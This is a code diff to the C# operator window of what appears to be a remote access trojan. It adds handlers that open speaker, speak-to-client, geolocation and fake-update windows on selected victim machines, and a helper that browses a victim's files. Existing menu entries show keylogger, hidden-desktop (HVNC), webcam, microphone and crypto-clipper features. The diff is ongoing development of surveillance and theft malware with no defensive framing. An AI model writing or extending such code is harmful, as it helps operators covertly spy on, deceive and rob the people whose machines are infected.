@@ -2283,6 +2283,70 @@ public partial class ServerWindow : ThemedWindow
         }
     }
 
+    private async void Speaker_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<SpeakerWindow>(c.Id, () => new SpeakerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+    }
+
+    private async void SpeakToClient_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<SpeakToClientWindow>(c.Id, () => new SpeakToClientWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+    }
+
+    private async void Geolocation_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<GeoWindow>(c.Id, () => new GeoWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+    }
+
+    private async void FakeUpdate_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+        {
+            OpenFeatureWindow<FakeUpdateWindow>(c.Id, () => new FakeUpdateWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
+    }
+
+    // Opens a File Manager window for the given client and navigates it to the specified path.
+    internal async void OpenFileManagerAt(string clientId, string path)
+    {
+        if (_server == null) return;
+        var key = $"{clientId}:{nameof(FileManagerWindow)}";
+        if (_featureWindows.TryGetValue(key, out var existing) && existing is FileManagerWindow fmExisting)
+        {
+            if (existing.WindowState == WindowState.Minimized) existing.WindowState = WindowState.Normal;
+            existing.Activate();
+            await fmExisting.NavigateTo(path);
+            return;
+        }
+        var win = new FileManagerWindow(_server, clientId, clientId);
+        _featureWindows[key] = win;
+        win.Closed += (_, _) => _featureWindows.Remove(key);
+        win.Show();
+        await Task.Delay(300);
+        await win.NavigateTo(path);
+    }
+
     private async void Fun_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
@@ -8425,6 +8489,10 @@ Read-Host 'Press Enter to close'
         if (MenuItemWebcam        != null) MenuItemWebcam.Header        = Lang.Get("FEAT_WEBCAM");
         if (MenuItemHvnc          != null) MenuItemHvnc.Header          = Lang.Get("FEAT_HVNC");
         if (MenuItemMicrophone    != null) MenuItemMicrophone.Header    = Lang.Get("FEAT_MICROPHONE");
+        if (MenuItemSpeaker       != null) MenuItemSpeaker.Header       = Lang.Get("FEAT_SPEAKER");
+        if (MenuItemSpeakToClient != null) MenuItemSpeakToClient.Header = Lang.Get("FEAT_SPEAK_TO_CLIENT");
+        if (MenuItemGeolocation   != null) MenuItemGeolocation.Header   = Lang.Get("FEAT_GEOLOCATION");
+        if (MenuItemFakeUpdate    != null) MenuItemFakeUpdate.Header    = Lang.Get("FEAT_FAKE_UPDATE");
         if (MenuItemKeylogger     != null) MenuItemKeylogger.Header     = Lang.Get("FEAT_KEYLOGGER");
         if (MenuItemPerfMonitor   != null) MenuItemPerfMonitor.Header   = Lang.Get("FEAT_PERF_MONITOR");
 
@@ -9367,8 +9435,13 @@ Read-Host 'Press Enter to close'
             "InstalledAppsWindow" => "Installed Programs",
             "DeviceManagerWindow" => "Device Manager",
             "PerformanceMonitorWindow" => "Performance Monitor",
-            "KeyloggerWindow" => "Keylogger",
+            "KeyloggerWindow"    => "Keylogger",
             "CryptoClipperWindow" => "Crypto Clipper",
+            "SpeakerWindow"          => Lang.Get("FEAT_SPEAKER"),
+            "SpeakToClientWindow"    => Lang.Get("FEAT_SPEAK_TO_CLIENT"),
+            "FileSearchWindow"       => Lang.Get("FEAT_FILE_SEARCH"),
+            "GeoWindow"           => Lang.Get("FEAT_GEOLOCATION"),
+            "FakeUpdateWindow"    => Lang.Get("FEAT_FAKE_UPDATE"),
             _ => win.Title
         };
     }
